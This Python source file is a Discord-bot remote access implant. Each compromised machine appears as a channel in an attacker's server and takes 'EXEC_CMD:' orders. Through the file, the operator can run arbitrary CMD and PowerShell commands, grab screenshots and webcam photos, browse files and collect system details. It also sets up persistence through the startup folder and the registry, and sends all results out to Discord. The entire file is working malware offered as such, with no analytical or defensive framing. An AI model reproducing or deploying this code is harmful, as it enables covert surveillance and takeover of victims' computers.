import discord
import os
import socket
import asyncio
import shlex

# Import all execution modules
import command_executor as cmd; import notification_sender as notifier; import screenshot_taker as ss
import system_info as sysinfo; import web_opener; import startup_manager
import webcam_manager as wcm; import file_explorer as fe; import persistence_manager as pm

# --- Configuration ---
TOKEN_PATH = 'token.txt'
INSTRUCTION_PREFIX = 'EXEC_CMD:'; PONG_PREFIX = 'PONG:'
LIVE_SESSIONS_CATEGORY = "🔴 Live Sessions"; DOWN_SESSIONS_CATEGORY = "⚫️ Down Sessions"
EMBED_COLOR = 0x2B2D31

# --- Bot Setup ---
intents = discord.Intents.default(); intents.message_content = True
client = discord.Client(intents=intents)

# --- Helpers ---
def load_token():
    if not os.path.exists(TOKEN_PATH): raise FileNotFoundError(f"Token file not found: {TOKEN_PATH}")
    with open(TOKEN_PATH, 'r') as f: return f.read().strip()
def get_device_name():
    hostname = socket.gethostname(); return "".join(c for c in hostname.lower() if c.isalnum() or c == '-').strip()

# --- Core Event Handlers ---
@client.event
async def on_ready():
    print(f'Implant logged in as {client.user} on device {get_device_name()}')
    if not client.guilds: return
    guild = client.guilds[0]
    device_name = get_device_name()
    live_category = discord.utils.get(guild.categories, name=LIVE_SESSIONS_CATEGORY)
    if not live_category:
        try: live_category = await guild.create_category(LIVE_SESSIONS_CATEGORY)
        except discord.Forbidden: return
    down_category = discord.utils.get(guild.categories, name=DOWN_SESSIONS_CATEGORY)
    channel = discord.utils.get(guild.text_channels, name=device_name)
    if not channel:
        try: channel = await guild.create_text_channel(device_name, category=live_category)
        except discord.Forbidden: return
    if channel.category == down_category:
        print("Device was in Down Sessions, moving back to Live.")
        await channel.edit(category=live_category)
    try:
        embed = discord.Embed(title="🟢 New Session Started", description=f"Device **{device_name}** is now online and ready for commands.", color=discord.Color.green())
        await channel.send(embed=embed)
    except discord.Forbidden: pass

@client.event
async def on_message(message):
    device_name = get_device_name()
    if message.channel.name != device_name or not message.content.startswith(INSTRUCTION_PREFIX): return
    content = message.content[len(INSTRUCTION_PREFIX):]
    parts = content.split(' ', 1)
    command_name = parts[0]
    args_str = parts[1] if len(parts) > 1 else ""

    # MODIFIED: Send channel ID with pong for unambiguous tracking.
    if command_name == "ping":
        await message.channel.send(f"{PONG_PREFIX}{message.channel.id}")
        return

    try:
        if command_name == "kill":
            embed = discord.Embed(title="🔴 Session Terminated", description=f"Device **{device_name}** has been shut down via remote command.", color=discord.Color.red())
            await message.channel.send(embed=embed)
            await client.close()
        elif command_name == "runcmd":
            output = cmd.execute_command(args_str); embed = discord.Embed(title="📟 CMD Output", description=f"```cmd\n{output[:1980]}\n```", color=EMBED_COLOR)
            await message.channel.send(embed=embed)
        elif command_name == "runpw":
            output = cmd.execute_powershell(args_str); embed = discord.Embed(title=" PowerShell Output", description=f"```powershell\n{output[:1980]}\n```", color=EMBED_COLOR)
            await message.channel.send(embed=embed)
        elif command_name == "takescreenshot":
            ss_file = ss.take_screenshot()
            if ss_file and os.path.exists(ss_file):
                embed=discord.Embed(title="📸 Screenshot Captured",color=EMBED_COLOR);f=discord.File(ss_file,filename="screenshot.png");embed.set_image(url="attachment://screenshot.png")
                await message.channel.send(file=f,embed=embed);os.remove(ss_file)
            else:raise Exception("Failed to create screenshot file.")
        elif command_name == "irlpicture":
            img_path = await asyncio.to_thread(wcm.capture_webcam_image)
            if img_path and os.path.exists(img_path):
                embed=discord.Embed(title="📷 Webcam Image Captured",color=EMBED_COLOR);f=discord.File(img_path,filename="webcam.png");embed.set_image(url="attachment://webcam.png")
                await message.channel.send(file=f,embed=embed);os.remove(img_path)
            else:raise Exception("Failed to capture webcam image.")
        elif command_name == "systemspecs":
            specs=sysinfo.get_specs();embed=discord.Embed(title=f"💻 System Specs for {device_name}",color=discord.Color.blue())
            embed.add_field(name="Operating System",value=f"{specs.get('platform','N/A')} {specs.get('platform_release','N/A')}",inline=False);embed.add_field(name="CPU",value=f"{specs.get('cpu_name','N/A')}",inline=False);embed.add_field(name="RAM Usage",value=f"{specs.get('ram_usage_percent','N/A')}% ({specs.get('ram_available','N/A')} of {specs.get('ram_total','N/A')})",inline=False)
            await message.channel.send(embed=embed)
        elif command_name == "shownotification":
            t,m=shlex.split(args_str);s=notifier.show(t,m)
            msg="Successfully displayed notification." if s else "Failed to display notification.";embed=discord.Embed(title="🖥️ Notification Status",description=msg,color=discord.Color.green() if s else discord.Color.orange())
            await message.channel.send(embed=embed)
        elif command_name == "openwebsite":
            s=web_opener.open_url(args_str)
            msg=f"Successfully attempted to open `{args_str}`." if s else f"Failed to open `{args_str}`.";embed=discord.Embed(title="🌐 Open URL Status",description=msg,color=discord.Color.green() if s else discord.Color.orange())
            await message.channel.send(embed=embed)
        elif command_name == "putinstartup":
            status = startup_manager.add_to_startup();embed=discord.Embed(title="⚙️ Startup Folder Status", description=f"`{status}`", color=EMBED_COLOR)
            await message.channel.send(embed=embed)
        elif command_name == "persist":
            status = pm.add_to_registry(args_str);embed=discord.Embed(title="⚙️ Registry Persistence Status", description=f"`{status}`", color=EMBED_COLOR)
            await message.channel.send(embed=embed)
        elif command_name == "explore":
            embed=fe.create_explorer_embed(args_str);await message.channel.send(embed=embed)
        
    except Exception as e:
        embed=discord.Embed(title="❌ Implant Error",description=f"An error occurred on `{device_name}`:\n```py\n{e}\n```",color=discord.Color.red())
        await message.channel.send(embed=embed)

# --- Main Execution Block ---
async def main():
    try:
        await client.start(load_token())
    except discord.errors.LoginFailure:
        print("❌ IMPLANT: Failed to log in. Please check the token.")
    except Exception as e:
        print(f"An unexpected error occurred in implant: {e}")
    finally:
        if not client.is_closed():
            await client.close()
            print("IMPLANT: Connection closed.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nIMPLANT: Shutdown initiated by user.")